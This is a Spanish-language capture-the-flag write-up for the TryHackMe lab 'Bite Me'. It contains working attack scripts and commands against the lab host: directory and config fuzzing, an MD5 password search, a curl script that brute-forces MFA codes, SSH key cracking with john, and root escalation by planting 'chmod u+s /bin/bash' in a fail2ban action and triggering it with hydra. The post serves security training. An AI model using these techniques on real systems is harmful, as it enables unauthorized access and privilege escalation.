---
title: Bite Me - TryHackMe
layout: post
permalink: /writeups/THM/biteme
date: 2025-04-07 11:00:00 -0000
categories: [Laboratorios]
tags: [TryHackMe]
description: >
  Write up en español para Bite Me - TryHackMe
pin: false  
toc: true   
math: false 
mermaid: false 
---

## Escaneo de puertos

```bash
nmap -sV -Pn -T4 -O 10.10.20.188
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-07 19:16 CEST
Nmap scan report for 10.10.20.188
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Puerto 80

El puerto 80 por defecto está abierto y está corriendo Apache.

![alt text](/assets/img/writeups/tryhackme/biteme/image.png)

### Enumeración de directorios

```bash
gobuster dir -u http://10.10.20.188 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.188
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/console              (Status: 301) [Size: 314] [--> http://10.10.20.188/console/]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

Descubrimos un panel de login en /console.

Probamos de nuevo el descubrimiento de directorios.

```bash
gobuster dir -u http://10.10.20.188/console -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 30
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.20.188/console
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/css                  (Status: 301) [Size: 318] [--> http://10.10.20.188/console/css/]
/index.php            (Status: 200) [Size: 3961]
/robots.txt           (Status: 200) [Size: 25]
/securimage           (Status: 301) [Size: 325] [--> http://10.10.20.188/console/securimage/]
Progress: 4744 / 4745 (99.98%)
===============================================================
Finished
===============================================================
```

En securimage encontramos un directorio abierto con información sobre plugin del captcha que utiliza en PHP.

![alt text](/assets/img/writeups/tryhackme/biteme/image-1.png)

```bash
NAME:

    Securimage - A PHP class for creating captcha images and audio with many options.

VERSION:

    3.6.8
```
Aquí encontramos también un archivo `words.txt`.

![alt text](/assets/img/writeups/tryhackme/biteme/image-6.png)

Sabiendo que existen archivos PHP de configuración podemos intentar forzar para descubrir algunas configuraciones.

Archivos como config.php, config.inc.php, config.phps, etc.

Podemos utilizar herramientas o utilizar un script sencillo como el siguiente:

```python
#!/usr/bin/env python3

import requests
import sys

def fuzz_configs(url):
    # Algunos nombres comunes de archivos de configuración
    potential_configs = [
        "config.php",
        "config.php.bak",
        "config.php~",
        "config.phps",
        "config.old",
        "config.txt",
        "config.inc",
        "config.inc.php",
        "config.bak",
        "wp-config.php",
        "wp-config.php.bak",
        "db_config.php",
        "dbconfig.php",
        "dbconfig.txt",
        "database.ini",
        "localsettings.php",
        "settings.php",
    ]

    # Ajusta el timeout a tus necesidades
    timeout_value = 5

    # Mostramos en pantalla un header informativo
    print(f"\n[+] Iniciando fuzzing de configuraciones en: {url}\n")

    for conf_file in potential_configs:
        # Construimos la URL completa
        full_url = f"{url.strip('/')}/{conf_file}"
        
        try:
            response = requests.get(full_url, timeout=timeout_value)
            status_code = response.status_code
            
            # Filtramos códigos de estado interesantes
            if status_code not in [404, 400, 405]:
                print(f"[{status_code}] => {full_url}")
        
        except requests.exceptions.RequestException as e:
            # Errores de conexión, timeout, etc.
            print(f"[-] Error al conectar con {full_url}: {e}")

    print("\n[+] Fuzzing finalizado.\n")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Uso: python {sys.argv[0]} <URL>")
        print(f"Ejemplo: python {sys.argv[0]} http://10.10.20.188")
        sys.exit(1)

    target_url = sys.argv[1]
    fuzz_configs(target_url)
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-2.png)

![alt text](/assets/img/writeups/tryhackme/biteme/image-3.png)

Encontramos un string de código en hexacimal que al decoficiarlo nos muestra un nombre de usuario.

![alt text](/assets/img/writeups/tryhackme/biteme/image-4.png)

Buscando más archivos posibles de configuración encontramos el siguiete:

![alt text](/assets/img/writeups/tryhackme/biteme/image-5.png)

Este archivo mustra como se valida la contraseña del usuario. La valida cuando el hash independientemente de la contraseña introducida este termine en **001**.

Como vemos en la función el hash que se comprueba es **MD5**.

Sabiendo esto y teniendo la lista words.txt que encontramos antes podemos intentar ver cual de los hashes es el correcto.

```bash
#!/bin/bash

wordlist="words.txt"

while IFS= read -r word; do
    hash=$(echo -n "$word" | md5sum | awk '{print $1}')
    if [[ $hash == *001 ]]; then
        echo "The password is: $word"
        break
    fi
done < "$wordlist"
```

```bash	
./hashes.sh
The password is: bXXXXy
```

Ahora que tenemos usuario y contraseña podemos autenticarnos.

## Bypass de la autenticación MFA

![alt text](/assets/img/writeups/tryhackme/biteme/image-7.png)

Parece que tenemos un MFA activo.

Mirando el código fuente de la web podemos ver la función con la que se maneja el submit del MFA.

![alt text](/assets/img/writeups/tryhackme/biteme/image-8.png)

Mirando la función vamos a ver un mensaje que dice ser necesario implementar mecanismos de seguridad para evitar el ataque de fuerza bruta, justo lo que vamos a aprovechar.

![alt text](/assets/img/writeups/tryhackme/biteme/image-9.png)

### Brute forcing de la clave

Como nos indica el mensaje la clave es de 4 dígitos por lo que vamos a ello.

- Creamos un diccionario de claves

```bash
crunch 4 4 1234567890 > /tmp/MFA
```

- Capturamos con Burp Suite

![alt text](/assets/img/writeups/tryhackme/biteme/image-10.png)

Ahora para hacer el brute forcing Burp Suite va a tardar demasiado y tuve problemas con hydra así que usé el siguiente script:

```bash
#!/bin/bash

TARGET="http://10.10.56.136/console/mfa.php"
COOKIE="PHPSESSID=38foerd2ev0ekkvib75uv13484; user=jason_test_account; pwd=braggy"
WORDLIST="MFA.txt"
THREADS=25  # Puedes subirlo si el servidor aguanta

echo "[+] Bruteforce iniciado... solo se mostrará el código correcto."

cat "$WORDLIST" | xargs -P "$THREADS" -I {} bash -c '
  CODE={}
  RESPONSE=$(curl -s -X POST "'"$TARGET"'" \
    -d "code=$CODE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -H "Cookie: '"$COOKIE"'" \
    -H "Referer: '"$TARGET"'" \
    -H "User-Agent: Mozilla/5.0")

  if ! echo "$RESPONSE" | grep -q "Incorrect code"; then
    echo "[✔] Código correcto encontrado: $CODE"
    pkill -P $$ curl 2>/dev/null
    kill $$ 2>/dev/null
  fi
'
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-11.png)

## Panel de archivos

![alt text](/assets/img/writeups/tryhackme/biteme/image-12.png)

Podemos buscar y visualizar archivos del sistema.

![alt text](/assets/img/writeups/tryhackme/biteme/image-13.png)

Utiliza la función `scandir` para listar los archivos y directorios.	

![alt text](/assets/img/writeups/tryhackme/biteme/image-14.png)

Desde aquí ya podemos ver la flag de usuario.

![alt text](/assets/img/writeups/tryhackme/biteme/image-15.png)

### Acceso por ssh

Buscamos claves ssh en el sistema.

![alt text](/assets/img/writeups/tryhackme/biteme/image-16.png)

Como se encuentra encriptada utilizamos el siguiente comando para descifrarla.

```bash
ssh2john id_rsa > jasonkey
john jasonkey --wordlist=/usr/share/wordlists/rockyou.txt
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-17.png)

Listo, ahora damos permisos al archivo y tenemos acceso al sistema.

```bash
chmod 600 id_rsa
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-18.png)

## Escalado de privilegios

Como vemos en el comando `sudo -l` el usuario:

🟥 (ALL : ALL) ALL
Puedes ejecutar cualquier comando como root, si sabemos la contraseña de jason.

🟩 (fred) NOPASSWD: ALL
Puedes ejecutar cualquier comando como el usuario fred sin contraseña.

Por lo tanto vamos a pasar al usuario fred.

```bash
sudo -s -u fred
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-19.png)

Ahora como fred.

Podemos reiniciar el servicio fail2ban como root sin contraseña. Si podemos modificar su unidad de sistema o algo que cargue, podemos  ejecutar cualquier comando como root al reiniciar.

Aprovechando la explicación de una vulnerabilidad conocida en este [post](https://hackmd.io/@tahaafarooq/privilege-escalation-fail2ban)

- Resumen de la vulnerabilidad

fail2ban ejecuta acciones como root cuando detecta actividad maliciosa (como fuerza bruta).

Esas acciones se definen en archivos como /etc/fail2ban/action.d/iptables-multiport.conf.

Si podemos modificar esos archivos, podemos colarle un comando malicioso que se ejecuta como root.

Luego hacmeos que se dispare la acción (por ejemplo, fallando un login muchas veces).

### Fail2ban

Verificamos permisos sobre `` /etc/fail2ban/action.d`

![alt text](/assets/img/writeups/tryhackme/biteme/image-20.png)

Confirma que tenemos escritura en:

`/etc/fail2ban/action.d/iptables-multiport.conf`

Añadimos la siguiente linea al archivo:

```plaintext	
actionban = chmod u+s /bin/bash
```

![alt text](/assets/img/writeups/tryhackme/biteme/image-21.png)

Reiniciamos el servicio fail2ban.

```bash
sudo systemctl restart fail2ban
```

Realizamos un ataque de fuerza bruta.

```bash
hydra -l root -P MFA.txt 10.10.56.136 ssh
```

Y pasados unos segundos...

![alt text](/assets/img/writeups/tryhackme/biteme/image-22.png)

